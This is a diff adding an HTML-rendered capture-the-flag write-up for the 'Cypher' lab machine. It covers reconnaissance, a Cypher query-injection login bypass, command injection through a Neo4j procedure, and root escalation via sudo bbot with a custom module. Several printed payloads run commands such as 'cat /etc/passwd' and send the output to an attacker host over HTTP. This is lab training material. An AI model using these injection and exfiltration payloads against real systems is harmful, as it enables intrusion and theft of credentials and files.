@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>report.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="cypher">Cypher</h1>
+<h3 id="machine-information">Machine Information</h3>
+<p><img src="./images/Cypher.png" alt="machine info"></p>
+<p>Target: <strong>10.10.11.57</strong></p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<pre class="hljs"><code><div>$ nmap -sV -sC 10.10.11.57
+</div></code></pre>
+<p><img src="./images/nmap.png" alt="nmap"></p>
+<ul>
+<li>22/tcp, OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)</li>
+<li>80/tcp, HTTP nginx 1.24.0 (Ubuntu)
+<ul>
+<li>Redirects to cypher.htb</li>
+</ul>
+</li>
+</ul>
+<p>First, it is necessary to update the local DNS in <code>/etc/hosts</code> by adding a new record:</p>
+<pre class="hljs"><code><div>$ sudo <span class="hljs-built_in">echo</span> <span class="hljs-string">'10.10.11.57  cypher.htb'</span> &gt;&gt; /etc/hosts
+</div></code></pre>
+<p>Visiting <code>http://cypher.htb</code>, the following result is obtained:</p>
+<p><img src="./images/cypher_page.png" alt="cypher page"></p>
+<p>No relevant information is found by visiting the &quot;visible&quot; paths, except for the presence of a <code>Login</code> form.</p>
+<p><img src="./images/cypher_login_page.png" alt="cypher login page"></p>
+<p>A Gobuster instance is launched to enumerate directories.</p>
+<pre class="hljs"><code><div>$ gobuster dir -u http://cypher.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+</div></code></pre>
+<p><img src="./images/gobuster.png" alt="gobuster"></p>
+<p>The scan detected the presence of the <code>testing/</code> directory:</p>
+<p><img src="./images/testing.png" alt="testing dir"></p>
+<p>Download it and analyze:</p>
+<p><img src="./images/apoc_tree.png" alt="apoc tree"></p>
+<ul>
+<li><a href="https://neo4j.com">Neo4j</a> is a Graph Database Management System (GDBMS).</li>
+</ul>
+<p>A Java class decompiler was used to inspect the <code>.class</code> files.</p>
+<p>For example, in this case, <a href="https://www.decompiler.com/">Decompiler</a> was used.</p>
+<p><img src="./images/hello_function.png" alt="hello procedure"></p>
+<p><img src="./images/custom_function.png" alt="custom procedure"></p>
+<p>It appears that <code>Neo4j</code> provides developers with the ability to perform graph queries using the declarative language <code>Cypher</code>.</p>
+<ul>
+<li><a href="https://neo4j.com/product/cypher-graph-query-language/">Cypher</a> is a declarative graph query language.</li>
+</ul>
+<p>Additionally, from the <a href="https://neo4j.com/docs/cypher-cheat-sheet/5/all/">cheat sheet</a>, it was found that procedures can be invoked using the <code>CALL</code> clause.</p>
+<blockquote>
+<p>The CALL clause is used to call a procedure deployed in the database.</p>
+</blockquote>
+<p>These two functions appear to be procedures that can be called.</p>
+<p>The most interesting one seems to be <code>getUrlStatusCode</code>, as it executes the <code>curl</code> command, accepting a URL parameter passed in the query.</p>
+<p><strong>IDEA</strong>: Cypher query injection.</p>
+<h2 id="login-bypass">Login bypass</h2>
+<p>The login form is exploited.</p>
+<p><img src="./images/login_injection_1.png" alt="login injection 1"></p>
+<p><img src="./images/login_injection_2.png" alt="login injection 2"></p>
+<p>Now, an attempt is made to call the <code>getUrlStatusCode</code> procedure to retrieve information about the username and password.</p>
+<p><img src="./images/login_injection_3.png" alt="login injection 3"></p>
+<p><img src="./images/uname.png" alt="uname"></p>
+<p>The same approach is used to capture the hashed password. The following was obtained:</p>
+<ul>
+<li>graphasm:9f54ca4c130be6d529a56dee59dc2b2090e43acf</li>
+</ul>
+<p>It is an SHA1 hash, as indicated by the query being attacked.</p>
+<p>An attempt is made to crack the hash, but without success. The next idea is to modify the behavior.</p>
+<p><img src="./images/hash.png" alt="db hash"></p>
+<p>Since the hash value returned by the query is used, it is possible to return a custom hash value to bypass authentication.</p>
+<p><img src="./images/hash payload.png" alt="hash payload"></p>
+<p><img src="./images/logged.png" alt="logged"></p>
+<p>Successfully logged in as <code>graphasm</code>!</p>
+<p><img src="./images/demo.png" alt="demo page"></p>
+<h2 id="query-injection">Query Injection</h2>
+<p>A Cypher query injection is attempted to obtain relevant system information.</p>
+<pre class="hljs"><code><div>CALL custom.getUrlStatusCode('http://10.10.16.41:8000?q=`ls| tr &quot; &quot; &quot;_&quot; | tr &quot;\n&quot; &quot;_&quot;`;') yield statusCode
+</div></code></pre>
+<p><img src="./images/ls.png" alt="ls"></p>
+<p><img src="./images/ls_res.png" alt="ls result"></p>
+<pre class="hljs"><code><div>CALL custom.getUrlStatusCode('http://10.10.16.41:8000?q=`cat /etc/passwd | tr &quot; &quot; &quot;_&quot; | tr &quot;\n&quot; &quot;_&quot;`;') yield statusCode
+</div></code></pre>
+<p><img src="./images/etc_passwd.png" alt="/etc/passwd"></p>
+<p><img src="./images/etc_passwd_res.png" alt="/etc/passwd result"></p>
+<p><img src="./images/etc_passwd_clean.png" alt="/etc/passwd result"></p>
+<pre class="hljs"><code><div>CALL custom.getUrlStatusCode('http://10.10.16.41:8000?q=`whoami | tr &quot; &quot; &quot;_&quot; | tr &quot;\n&quot; &quot;_&quot;`;') yield statusCode
+</div></code></pre>
+<ul>
+<li>neo4j</li>
+</ul>
+<p>It is possible to navigate <code>/home/graphasm/</code>:</p>
+<pre class="hljs"><code><div>CALL custom.getUrlStatusCode('http://10.10.16.41:8000?q=`ls /home/graphasm/ | tr &quot; &quot; &quot;_&quot; | tr &quot;\n&quot; &quot;_&quot;`;') yield statusCode
+</div></code></pre>
+<p>Located files:</p>
+<ul>
+<li>user.txt</li>
+<li>bbot_preset.yml</li>
+</ul>
+<p>However, <code>user.txt</code> is not readable, while <code>bbot_preset.yml</code> contains the following content:</p>
+<pre class="hljs"><code><div>CALL custom.getUrlStatusCode('http://10.10.16.41:8000?q=`cat /home/graphasm/bbot_preset.yml | tr &quot; &quot; &quot;_&quot; | tr &quot;\n&quot; &quot;_&quot;`;') yield statusCode
+</div></code></pre>
+<p><img src="./images/bbot_preset_retrive.png" alt="bbot_preset.yml"></p>
+<ul>
+<li>neo4j:cU4btyib.20x**********hK</li>
+</ul>
+<p>An SSH connection is attempted with <code>graphasm</code> using the discovered password:</p>
+<p><img src="./images/graphasm_ssh.png" alt="graphasm ssh access"></p>
+<p>Successfully accessed with:</p>
+<ul>
+<li>graphasm:cU4btyib.20x**********hK</li>
+</ul>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p><img src="./images/sudo_l.png" alt="sudo -l"></p>
+<p><a href="https://www.blacklanternsecurity.com/bbot/Stable/">bbot</a> is a recursive internet scanner for hackers.</p>
+<p>It offers some functionalities, and during the study of the program, it was found that <code>custom modules</code> can be created.</p>
+<p><img src="./images/bbot_dev_docs.png" alt="bbot docs"></p>
+<p><a href="https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/">How to write a BBOT Module</a></p>
+<p><strong>IDEA</strong>: Exploit BBOT to read arbitrary sensitive data.</p>
+<p>A module <code>mymodule.py</code> is built:</p>
+<p><img src="./images/ls_root.png" alt="ls root">
+and a <code>my_preset.yml</code> is defined for this module:</p>
+<p><img src="./images/my_preset.png" alt="my_preset.yml file"></p>
+<p>Launch BBOT with the custom preset and module:</p>
+<pre class="hljs"><code><div>sudo /usr/<span class="hljs-built_in">local</span>/bin/bbot -p ./my_preset.yml -m mymodule
+</div></code></pre>
+<p><img src="./images/ls_root_res.png" alt="ls root result"></p>
+<p>The command was successfully executed! The flag is retrieved.</p>
+<p><img src="./images/cat_root.png" alt="cat root"></p>
+<p><img src="./images/cat_root_res.png" alt="cat root result"></p>
+<p>[+] Completed.</p>
+
+</body>
+</html>
